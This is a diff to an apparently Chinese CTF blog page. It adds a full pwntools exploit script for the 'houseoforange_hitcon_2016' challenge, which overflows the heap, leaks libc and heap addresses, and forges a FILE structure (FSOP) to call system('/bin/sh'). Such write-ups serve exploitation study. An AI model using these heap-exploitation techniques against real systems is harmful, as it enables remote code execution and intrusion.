@@ -261,6 +261,7 @@
     <li><a href="#buuhouseoforange_hitcon_2016">[BUU]houseoforange_hitcon_2016</a>
       <ol>
         <li><a href="#思路">思路</a></li>
+        <li><a href="#exp">exp</a></li>
       </ol>
     </li>
   </ol>
@@ -837,7 +838,114 @@
 <p>4 FSOP，_flags修改为binsh,vtable修改为&amp;vtable,然后修改overflow为system</p>
 <p>5再次malloc触发fsop</p>
 <p>其中 3 4由一次堆溢出完成</p>
-
+<h3 id="exp">exp
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#p=remote(&#39;node5.buuoj.cn&#39;,27013)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#libc=ELF(&#39;libc-2.23.so&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/home/fuguang/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">content</span><span class="p">,</span><span class="n">price</span><span class="p">:</span><span class="nb">int</span><span class="o">=</span><span class="mh">0xff</span><span class="p">,</span><span class="n">color</span><span class="p">:</span><span class="nb">int</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;choice&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Length of name :&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Name :&#39;</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Price&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">price</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Color&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">color</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;choice&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">content</span><span class="p">,</span><span class="n">price</span><span class="p">:</span><span class="nb">int</span><span class="o">=</span><span class="mh">0xff</span><span class="p">,</span><span class="n">color</span><span class="p">:</span><span class="nb">int</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;choice&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Length of name :&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Name:&#39;</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Price&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">price</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Color&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">color</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1f000000ff</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfa1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x400</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Name of house : &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libcbase</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span><span class="o">-</span><span class="mh">0x3c5162</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libcbase</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">=</span><span class="n">libcbase</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">io_list_all</span><span class="o">=</span><span class="n">libcbase</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_list_all&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;c&#39;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;c&#39;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">heapbase</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span><span class="o">-</span><span class="mh">0xc0</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">heapbase</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">pay</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x400</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">sys</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pay</span><span class="o">+=</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pay</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">io_list_all</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pay</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pay</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heapbase</span><span class="o">+</span><span class="mh">0x4f0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pay</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">13</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heapbase</span><span class="o">+</span><span class="mh">0x4f0</span><span class="o">+</span><span class="mh">0xd8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pay</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">sys</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span><span class="n">pay</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">io_list_all</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#gdb.attach(p)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;choice&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
 </section>
 
 
